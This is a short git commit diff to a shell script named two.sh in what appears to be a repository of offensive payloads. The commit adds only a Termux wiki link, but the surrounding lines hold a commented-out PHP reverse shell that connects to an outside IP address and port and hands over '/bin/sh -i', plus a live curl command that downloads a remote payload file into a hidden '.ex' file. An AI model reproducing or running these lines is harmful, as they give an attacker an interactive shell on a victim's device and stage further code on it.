7360c6cdc877e393617c2a9a943fac75fde9ec44
Tech EFX Tv <59799893+efxtv@users.noreply.github.com>
2022-11-30 23:43:50 +0530

    Update two.sh

--- Demo/server/files/two.sh
+++ Demo/server/files/two.sh
@@ -1,5 +1,6 @@
 #!/bin/bash
 #create file1 and paste
+#https://wiki.termux.com/wiki/Termux:API
 #php -r '$sock=fsockopen("193.161.193.99",20993);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
 #file2 started
 curl -s -S https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/server/files/one >.ex
